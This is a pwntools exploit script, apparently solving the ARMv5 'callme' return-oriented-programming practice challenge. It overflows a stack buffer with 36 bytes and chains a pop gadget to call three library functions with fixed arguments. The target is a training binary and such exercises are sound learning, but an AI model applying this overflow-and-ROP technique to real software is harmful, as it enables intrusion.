from pwn import *

context.arch = "arm"

elf = ELF("./callme_armv5")

gs = f"""
gef-remote --qemu-user --qemu-binary {elf.path} localhost 1234
file {elf.path}
b *pwnme+84
c
"""

io = process(["qemu-arm","-g","1234", elf.path])
gdb.attach(io, gdbscript=gs)

# lr register holds return address of a function call
pop_r0_r1_r2_lr_pc = 0x0010870

io.sendline(b"A" * 36 + \
        p32(pop_r0_r1_r2_lr_pc) + \
        p32(0xdeadbeef) + \
        p32(0xcafebabe) + \
        p32(0xd00df00d) + \
        p32(pop_r0_r1_r2_lr_pc) + \
        p32(elf.symbols["callme_one"]) + \

        p32(0xdeadbeef) + \
        p32(0xcafebabe) + \
        p32(0xd00df00d) + \
        p32(pop_r0_r1_r2_lr_pc) + \
        p32(elf.symbols["callme_two"]) + \

        p32(0xdeadbeef) + \
        p32(0xcafebabe) + \
        p32(0xd00df00d) + \
        p32(pop_r0_r1_r2_lr_pc) + \
        p32(elf.symbols["callme_three"]))

io.interactive()
